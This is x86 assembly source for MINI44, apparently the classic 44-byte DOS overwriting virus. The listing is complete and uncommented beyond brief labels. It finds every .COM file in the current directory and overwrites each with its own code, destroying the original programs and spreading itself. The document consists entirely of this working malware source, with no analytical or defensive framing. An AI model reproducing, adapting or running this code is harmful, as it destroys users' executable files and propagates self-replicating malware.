.model tiny
.code
FNAME EQU 9Eh
org 100h

MINI44:
   mov AH, 4Eh ; SEARCH FIRST
   mov DX, offset COMP_FILE
   int 21h
 SEARCH_LP:
   jc DONE
   ; OPEN find COM file
   mov AX, 3D01h
   mov DX, FNAME
   int 21h

   xchg AX, BX
   ; WRITE virus (RAM) in the HOST (executable on HDD)
   mov AH, 40h
   mov CL, 44
   mov DX, 100h
   int 21h

   ; CLOSE HOST file
   mov AH, 3Eh
   int 21h

   mov AH, 4Fh ; SEARCH NEXT
   int 21h

   jmp SEARCH_LP
DONE:
   ret

COMP_FILE DB '*.COM',0
END MINI44